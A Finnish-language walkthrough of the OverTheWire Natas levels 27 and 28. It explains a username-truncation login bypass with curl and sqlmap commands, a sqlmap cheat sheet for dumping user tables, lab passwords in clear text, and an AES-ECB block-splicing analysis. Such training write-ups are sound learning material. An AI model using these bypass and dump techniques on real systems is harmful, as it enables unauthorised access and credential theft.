# natas27 - START HERE;

natas27 ; u3RRffXjysjgwFU6b9xa23i6prmUsYne 

![alt text](./kuvat-level22-28/natas27-0.png)


syötin ainakin pari tunnusta mutta "admin:admin" sanoi : User admin was created!
kokeilin toista "testi.testi" - User testi was created!

syötin uudestaan (admin:admin) niin kirjautui sisään ja tuli tervetuloa - odotellaan n. 5 min (view-source mukaan) - pitäisi tyhjentää tietokannan - voiko se koskea näitä luoneita tunnuksia?

Eli periaatteessa tässä etusivun kirjautumisessa tapahtuu niin että joutuu luoda uuden tunnuksen ikään kuin (admin;admin) sitten pääsee kirjauttuu sisään ja tulee se tervetuloa admin. 5 min päästä se poistaa tämän luoneen tunnuksen tietokannasta ja huomoina tarkistettu se ei ainakaan tallenna evästeitä.

view-source.html:ssä on osa jotakin SQL komentoja koodattu tässä PHP funktoin määrityksen sisällä kuitenkin.

![alt text](./kuvat-level22-28/natas27-1.png)

![alt text](./kuvat-level22-28/natas27-2.png)

## koodin tarkistuksena - START HERE;

Eli käydään lävitse view-source.html:ssä mitä tässä koodissa oikein puhuttaan vaikka onkin SQL:ää tässä mainittu tosi osassa funktioiden alla.


Tässä , jos pyyntö sisältää käyttäjätunnus ja salasansa , kun lähetämme lomakkeen ja kuin täyttäisi uuden tunnuksensa.

```
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```



Seuraavaksi, yhteys ottaa tietokantaansa ja ohjelma tarkastaa käytäjätunnuksensa kelvolliseksi käyttämällä tätä funktiota `validUser()`.

```
function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```


Jos mikäli tunnistetieto (käyttäjätunus ja salasnsa) nini tarkistettaan funktiossa `checkCredentials` alla.

```
function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}

```


seuraavaksi, jos tunnusket täsmää ja kelvollisia niin sitten kaikki tunnukset dumpataan eli `dumpData` funktiolla - eli kuin tyhjentää sen tunnuksen pois alta.

```
function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}

```


Viimeisenä jos ei , niin voi luoda uuden käyttäjäntunnuksens ja salasansa - jos ei ole olemassa mikäli on dumpattu/tyhjennetty tietokannan alta - `createUser` - funktio.

```
function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}

```


🔎 Tilannekuva

Nyt yritettään pitää saada tietoa käyttäjästä natas28, mutta ei tiedetä tiedä **natas28** salasanaansa. Suoraa SQL-injektiota ei voi tehdä, koska kaikki syötteet suojataan `mysql_real_escape_string()`-funktiolla. Tästä syystä perinteinen SQL-injektio ei onnistu.


💡 Vihjeet ja havaintoja
1. checkCredentials() tarkistaa käyttäjätunnuksen JA salasanan.
Eli jos syötät väärän salasanan, saat virheilmoituksen.

2. validUser() ja dumpData() tarkistavat VAIN käyttäjätunnuksen.
Eli kun joku käyttäjätunnus löytyy, niin voit saada sen tiedot näkyviin — vaikka salasana olisi väärä.

3. Taulussa ei ole määritelty käyttäjänimen ainutlaatuisuutta!
Usein username on asetettu UNIQUE, mutta tässä ei ole. Tämä on kriittinen.

4. Käyttäjänimen ja salasanan sarakkeet ovat VARCHAR(64)
Jos laitat yli 64 merkkiä pitkän merkkijonon, MySQL leikkaa ylimääräiset pois (ellei strict mode ole käytössä, mikä tässä oletetaan olevan pois päältä).



🎯 Hyökkäysidea: Hyödynnä käyttäjänimen leikkaantumista

Koska username-kenttä on VARCHAR(64) ja ei ole ainutkertainen, voit luoda uuden käyttäjänimen, joka alkaa samalla tavalla kuin natas28, mutta jatkuu ylimääräisillä merkeillä yli 64 merkkiä.


- Esim, käyttäjänimellä: `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
- Salasana osuus: `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

Eli näissä molemmissa siis kun syötetään tietokantaan, MySQL **truncaa** (truncate table) sen 64 merkin kohdalla.

Jos tekisi  salasantarkistuksensa checkCredentials()-funktiolla, niin sinun syötteesi ei ole täsmälleen sama kuin tietokannassa oleva, joten salasanatarkistus epäonnistuu. Ei haittaa!

Kun taas käytät dumpData()-funktiota, joka hakee tietoja pelkän käyttäjänimen perusteella, niin jos teet uuden käyttäjän jolla on username = natas28 ja se tallentuu truncattuna samalla tavalla kuin oikea natas28, saatat osua oikean käyttäjän tietoihin — koska MySQL:n vertaillessa username-kenttää se näkee leikatun version.

- `mysql_real_escape_string()` - estää injektiot, mutta ei loogisia virheitä.
- Käyttämällä yli 64 merkkiä pitkää käyttäjänimeä, joka alkaa natas28, voit huijata järjestelmää dumpaamaan toisen käyttäjän tietoja.

---

## testejä

Tässä loin (admin:admin) tunnuksensa ja kirjauttumisella, että onnistui ja pitihän se testat toimiiko ja ensimmäiset testit.

![alt text](./kuvat-level22-28/natas27-3.png)
![alt text](./kuvat-level22-28/natas27-4.png)

Koodin tarkistuksensa kuitenkin ideana syöttäisi **natas28** - perässä jotakin arvoja joka täsmentyy tietokannan **VARCHAR (64)** merkintään niin pitkä AAA...~~ jotakin ja salasana saa keksiä suoraan päästä just (test) - joka on helpp muisti pelisääntö

![alt text](./kuvat-level22-28/natas27-5.png)
![alt text](./kuvat-level22-28/natas27-6.png)


Tässä (go away hacker) - tarkoitta kokeilin ihan normi tunnuksella (natas28: <randompassword>) - niin enterin jälkeen se antoi tällaisen koska se ei päästä helpolla. 

![alt text](./kuvat-level22-28/natas27-7.png)

Tämä on sama kuin aikaisempi, just mutta kokeiltua ideana syöttäisi **natas28** ja perässä jotakin sanaa pitkä AAAA ja kokeilin kirjauttumisen testin

![alt text](./kuvat-level22-28/natas27-8.png)

--

## Kali linux - chekkausta

natas27 ; u3RRffXjysjgwFU6b9xa23i6prmUsYne 

Eli koodin tarkistuksensa ja tuosta päättyessä antoikin vihjeitä, mutta nyt testataan kali linux ympäristön vuoro tarkistaa tämän harjoitus level.

Kokeillaan sqlmap - että mitä se tarjoaa ja onkin pieni sql injektio osuus. Huomoina sqlmap ei pysty automaattisesti hyödyntämään tätä tiettyä haavoittuvuutta (looginen bugi, ei injektio), koska se ei ymmärrä tietokannan kenttärajojen aiheuttamia leikkauksia tai autentikoinnin logiikkaa. Tässä ei ole SQL-injektiota.


Tuloksesta ei antanut mitään mutta jotakin ainakin.. testastiin varmuuden vuoksi ja hyvä harjoituksen testaus

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas27.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" --batch --risk=3 --level=5
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:26:14 /2025-08-08/

[19:26:16] [INFO] testing connection to the target URL
[19:26:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:26:17] [INFO] testing if the target URL content is stable
[19:26:17] [INFO] target URL content is stable
[19:26:17] [INFO] testing if parameter 'User-Agent' is dynamic
[19:26:17] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:26:17] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:26:17] [INFO] testing for SQL injection on parameter 'User-Agent'
......
.........
...........
[19:41:34] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:41:41] [INFO] testing 'Generic inline queries'
[19:41:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:41:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:42:10] [WARNING] parameter 'Host' does not seem to be injectable
[19:42:10] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:42:10] [WARNING] your sqlmap version is outdated

[*] ending @ 19:42:10 /2025-08-08/
```

Pientä curl testausta ja normi checkausta:
```
┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas28.natas.labs.overthewire.org/" -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" http://natas27.natas.labs.overthewire.org/
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 16:44:43 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Type: text/html; charset=UTF-8

┌──(kali㉿kali)-[~]
└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
-d "username=test&password=test" \
http://natas27.natas.labs.overthewire.org/

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User test was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**LISÄTIETOA:**
Haettu netistä lisätietoa ja apua, mutta tämä on tekoälyn apua. Tämä komento lähettää POST pyynnön ja tekee sellaisen arvauksensa.

Sovellus ei tarkistanut onko "samanniminen" käyttäjä jo olemassa, koska käyttäjänimi ei ole UNIQUE. Koska se käyttää VARCHAR(64) kenttää, MySQL leikkaa käyttäjänimen automaattisesti 64 merkkiin. Tuloksena on toinen käyttäjä, jonka truncattu käyttäjänimi on täsmälleen natas28, eli täsmää olemassa olevaan oikeaan käyttäjään.


Lyhyesti sanottuna on logiikkavirhe, ei SQL injektio ja onkin hyödyntämistä käyttäytymistä.

1. Lähetit lomakkeeseen yli 64-merkkisen käyttäjänimen, joka alkaa natas28.
2. MySQL katkaisi nimen 64 merkkiin, jolloin siitä tuli vain natas28, sama kuin olemassa oleva käyttäjä.
3. Koska käyttäjänimet eivät ole uniikkeja, tietokantaan lisättiin toinen natas28.
4. Nyt voit kirjautua sisään omalla salasanallasi käyttäen nimeä natas28.
5. Sovellus näyttää sinulle tiedot (ja salasanan) oikealta natas28-käyttäjältä, koska se ei tarkista salasanaa kunnolla.


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
-d "username=natas28$(python3 -c 'print("A"*100)')" \
-d "password=abc123" \
http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


Tämä osuus on kuin pieni sqlmap **sql injektion** lunttilappu osuus jos mikäli haluttaisiin tarkistaa toi natas27:sen tietokannan olemassaolon ja jos on niin mitä seuraavaksi pitäisi tehdä ja saada selville. 

```
testausta löytyykö injketiopiste

sqlmap -u "http://natas27.natas.labs.overthewire.org/" \
--auth-type Basic --auth-cred "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
--data "username=test&password=test" \
--batch --level=1 --risk=1 --identify-waf


- jos injkeito löytyy niin lisätään tietokanna nimen: --dbs
- jos tietokanta löytyy sitten lisätään perään: --tables -D <tietokannan_nimi>
- ja viimeisenä dumppaus ulos jos löytyy ja lisätään perään: --dump -D <tietokanta> -T users
```

## Testaus osa ja ratkaisu osa

Ratkaisu kohteena on siis käyttää se VARCHAR (64) merkkiä kokonaan ja jotenkin purkkaa se natas28 salasanansa ulos

1. Käytettään esim. käyttäjänimenä natas28 + paljon satunnaista täytettä (A, B, tms.) → esim. natas28AAAAAAAAAA...
2. Kun pituus ylittää 64 merkkiä, MySQL katkaisee sen tarkalleen 64 merkkiin.
3. Jos tämä katkaistu nimi vastaa täsmälleen oikeaa natas28, tietokanta ajattelee, että "tässä on toinen natas28".
4. Koska salasanaa ei tarkisteta kunnolla (tai käytetään väärää tarkistusta dumpissa), voit kirjautua sisään omalla salasanallasi ja saat näkyviin oikean natas28-käyttäjän salasanan.


kokeilin tunnuksella kuin (admin:admin) niin syötin tahallaan väärän salasanansa, niin antoi virallisen error - eli "admin" käyttäjälle syötetty väärä salasansa.

sama pätee tässä ei ole puhdas **ei ole puhdas SQL-injektio**, vaan perustuu **merkkijonon pituusrajoitukseen ja tietokannan käyttäytymiseen.**

TÄMÄ ON VAIN JOTAKIN TUNNUSTA MITÄ TESTAILIN JA ERILLISENÄ TUNNUKSENA:
```
Kokeillaan nyt: natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
salasana: natas

natas28           !
natas
```

Loin jonkun tunnarinsa natas28 (yksitoista välilyönti siis space) ja salasansa natas - se antoi "GO away hacker" - sekä testattu natas28AAAAAAAA..... jotakin ja syötin tahallaan väärä salasansa niin kertoi jotakin.

Toiseksi huomioina jos yrittää esim. luoda alkuun (test:test), sitten arvella (natas28:<randomPassword>) - niin ei toimi, koska voi olla tämä natas27 taso on vähä parantunut - että jouduttaan leikkiä vaihteeksi burp suite uusiksi ja tai jos python koodilla niin sekin voi toimia.


Tosiaan tämä osuus eli PHP-koodissa ja tämä tarkoittaa:

- Jos käyttäjänimessä on välilyöntejä alussa tai lopussa, sinut torpataan heti.
- `trim($user)` - poistaa alusta ja alopussa välilyöntejä
- jos alkuperäisen `$usr` siis käyttäjä ei ole sama kuin trimmattu versio sitten toistaa ton käskynsä. 

Tosiaan testattuna **natas28** ja 56 välilyöntiä --> tämä ehto tarkoittaa laukeaakseen, koska loppuu lisäntyvien välilyönnit poistetaan `trim()` - funktiolla.

```
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```

Tätä jotenkin loin ekaksi (test:test) tunnuksen sitten kirjautuu ekana sillä sisään ja onnistui, ja luodaan uusi tunnus (natas28 jolla on useita välilyöntiä) ja perään x , sekä salasana vaikappa "test" - luoneen jälkeen just tästä selaimesta peruuttaa taakse päin niin se tunnus pysyy ennallaan ja kumoaa perässä ton x sanan ja syöttää just se "test" salasansa niin sitten pääsee ja saada selvitettyä natas28 level salasansa.

se piti olla --> natas28 (57 välilyöntiä) ja peräsin perään x kirjaimen että tiedän mihin asti se päättyy
```
┌──(kali㉿kali)-[~]
└─$ echo -n "natas28" && printf ' %.0s' {1..57} && echo -n "x"
natas28                                                         x                                                                                 
```



## ratkaisu osa

Muutama testauksen jälkeen jouduin tarkistaa Youtube:stä miten ne on testattu, ja vertailtu muiden bloggien julkaisua, mutta sitten alkoi toimia ja se on ihme kyllä. Aikaisempien toisten ohjeita saattoi olla yli vuoden-pari-muutaman vuoden vanhoja.

Tässä viimeiset kuvat ovat just ne onnistumiset. Tätä jotenkin loin ekaksi (test:test) tunnuksen sitten kirjautuu ekana sillä sisään ja onnistui, ja luodaan uusi tunnus (natas28 jolla on useita välilyöntiä) ja perään x

Tässä se pitää olla --> natas28 (57 välilyöntiä) ja peräsin perään x kirjaimen että tiedän mihin asti se päättyy:
```
┌──(kali㉿kali)-[~]
└─$ echo -n "natas28" && printf ' %.0s' {1..57} && echo -n "x"
natas28                                                         x 
```

Eli natas28 (muutama kymmensiä välilyöntiä) ja x - sekä salasana vaikappa "test" - luoneen jälkeen just tästä selaimesta peruuttaa taakse päin niin se tunnus pysyy ennallaan ja kumoaa perässä ton **x kirjain**


![alt text](./kuvat-level22-28/natas27-9.png)

syöttää just se "test" salasansa niin sitten pääsee ja saada selvitettyä natas28 level salasansa.

![alt text](./kuvat-level22-28/natas27-10.png)

![alt text](./kuvat-level22-28/natas27-11.png)

--- 
<hr>

# natas 28 - START HERE;

Welcome natas28 !
Here is your data:
Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )


kirjoitin haku kenttään jotaikn satunnaista tekstiä ja sitten "search" nappia - jonka antoi tällaisen url (`http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJyuJN4JsfEV0tjnwsT7stHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`) - mahtaako tämä merkitä jotakin ja samahan sivusto muuttui ja tuli tälleinen otsikko (Whack Computer Joke Database).


jos haku kenttään ei syötä mitään niin suora "search" nappia niin antaa vihjeitä ja tämän vitsi tietokannan mikälie


jos syötän kenttään "joke" ja klikkasin "search" napin niin tuli tällainen:

Whack Computer Joke Database
I've got a really good UDP joke to tell you, but I don't know if you'll get it


Tosiaan hakukenttään jos syöttää virallista sanaa tai pari-muutama välilyöntiä se kertoo jonkun lyhyen vitsi - ja voi olla vain tietty sanat 


Muutamissa pisti tämä osuus ainakin.. -->"The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8"


Samahan haettusta search kentän jälkeen se antoi erillaisen URL - mutta pikaisella silmällä jotakin näyttää samalla ja kokonaisen URL parametri eivät ole identtinen. Tarkistettuna "query"= jälkeen tämä osuus näyttää samalla, mutta muuten loppu osa ei ole.. **Eroava osa on keskellä**, mikä viittaa siihen, että kyseessä voi olla esimerkiksi salatun datan eri lohkot

`http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLeIxYTeJ%2F0dro1G9VaeLyzKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`

`http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`

Tässä pari-muutamassa URL linkin kohdalla `search.php/` jälkeen jossa on kyselyä (query) jossa tulostaa jotakin tuntematonta tekstiä, ne on base64-enkoodattua stringiä


## Pieni teoria ja pohdinta

Tämä teoria ja ratkaisu osuus siis mitä tässä tapahtuu harjoituksen natas 28 levelissä on vähä muiden bloggien mukainen ohje, mutta kuulemma on yksi vaikeimmista tasoista.


Sivuston mukaan tekee kikkailun tekemän haun, se rakentaa siitä palvelimen puolella merkkijonon (jossa on vakio-alkuprefixi + käyttäjän syöte + mahdollinen suffiksi (muokkaa sanan merkitystä)), salaa sen **AES:llä ECB-tilassa**, **base64-koodaa** ja laittaa tuloksen **URL-parametriin**. Siksi alku pysyy samana (vakio‑prefixi → samat ensimmäiset lohkot), mutta keskiosa ja loppu muuttuvat, kun oma syötteesi ja pehmusteet vaihtuvat. ECB:ssä identtinen selkotekstilohko tuottaa aina identtisen salat ekstilohkon, ja se paljastaa rakennetta sekä mahdollistaa “cut‑and‑paste”‑kikkailun.


Sis mitä **ECB (Electronic Codebook) tarkoittaa**, miksi se on turvaton ja miten se liittyy Natas28-tasoon.

**🔐 Mikä on ECB-salaus?**
ECB (Electronic Codebook) on yksinkertaisin tapa käyttää lohkosalausta kuten AES:ää. Se toimii näin:

- Teksti jaetaan lohkoihin (yleensä 16 tavua = 128 bittiä).
- Jokainen lohko salataan erikseen samalla salausavaimella.
- Jos kaksi lohkoa ovat identtisiä, niiden salattu muoto on myös identtinen.


![alt text](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#/media/File:BlockCipherModesofOperation.svg)

Just aikiasempi kappaleen mukaann 3 tai jopa muutamia testauksissa ja tarkistuksena, se antoi näitä arvoja, ja query (kyselystä) eteenpäin.

Tässä (alhaalla) muutama esim. jossa vakio-alku osa, keskellä on lomakekenttä syötteeni mitä syötetty käyttöliittymäsä ja perässä mahdollinen vakiosuffiksi tai pehmuste (padding). Tuosta "`%2BJ2TdR0Qp8dcjP`" suurinpirtein tässä alkaa leikkaa se keski-osa, joka muuttuu vähittelen.

- `/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJyuJN4JsfEV0tjnwsT7stHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`
- `/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLeIxYTeJ%2F0dro1G9VaeLyzKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`

- `/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`

- `search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK%2FZEJpSw8lYr3%2BNDY3VpFZKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D`


**🔍 Mitä tapahtuu, kun URL muuttuu “hieman”?**
Kyseessä on AES-ECB-salauksella koodattu kyselymerkkijono, joka voi sisältää:

- Vakio-alkuosan (esim. "query:" tai jotain backend-määrityksiä)
- Oma syötteesi (lomakekenttä)
- Mahdollinen vakiosuffiksi tai pehmuste (padding)

ECB-salaus ei sekoita lohkoja keskenään, vaan jokainen 16 tavun lohko salataan erikseen. Kun syötteesi menee keskelle lohkosarjaa, muuttuvat vain ne lohkot, jotka sisältävät syötteen, ei alku.


**Miksi URL-parametrin alku pysyy samana, mutta keskiosa ja loppu muuttuvat?**

- Vakio‑prefixi: Sovellus liittää syötteesi eteen kiinteän tekstin (esim. kyselypohjan). Tämä muodostaa ensimmäiset lohkot, jotka pysyvät samana → sama alku base64‑merkkijonossa.

- Syöte muuttaa seuraavia lohkoja: Kun muutat omaa tekstiäsi, nimenomaan ne lohkot, joissa syöte sijaitsee, vaihtuvat → keskiosa muuttuu.

- Pehmuste (PKCS#7) vaikuttaa loppuun: Pituuden muutos vaikuttaa viimeiseen lohkoon ja pehmusteeseen → loppu näyttää “täysin eri” jokaisella pituudella. Jos sotket tavumääriä, näet joskus “padding error” ‑tyyppisiä virheitä.


### vihjeenä ratkaisuun

**🧪 Miten testaus toimii CTF-logiikassa?**
Tee syötteitä, joissa on toistuvaa merkkijonoa (esim. AAAAAAAAAAAAAAAA x2). Jos näet URL:ssa toistuvan 24-merkkisen base64-pätkän → varmistus ECB:stä.

Lisää yksi merkki kerrallaan syötteeseen ja tarkkaile, milloin base64-pituus hyppää 24 merkkiä → se paljastaa uuden lohkon alun.

Kun saat “syötteen lohkon” kohdalle, voit kopioida sen base64:stä ja liittää toiseen kohtaan — testaa, mitä palvelin vastaa.


**💡 Lomakekenttä uudelleenkäyttö: mitä palvelin tekee?**
Vaikka URL-parametri muuttuu, palvelin todennäköisesti purkaa sen salatuksi kyselyksi ja käyttää sitä SQL- tai hakuoperaation syötteenä. Jos salattu syöte menee oikein lohkorajalle → koko "search string" saattaa sisältää esim. admin tai vastaavaa.


## testausta ja oma versio





### linkistä lisäteoriaa ja apua

https://learnhacking.io/overthewire-natas-level-28-walkthrough/

https://the-dark-lord.medium.com/natas-wargames-16-30-fbde4edd41d4

https://axcheron.github.io/writeups/otw/natas/#natas-28-solution

https://anyafachri.medium.com/ebc-block-splicing-attack-for-successful-sql-injection-natas28-overthewire-write-up-6e83eb1815ac



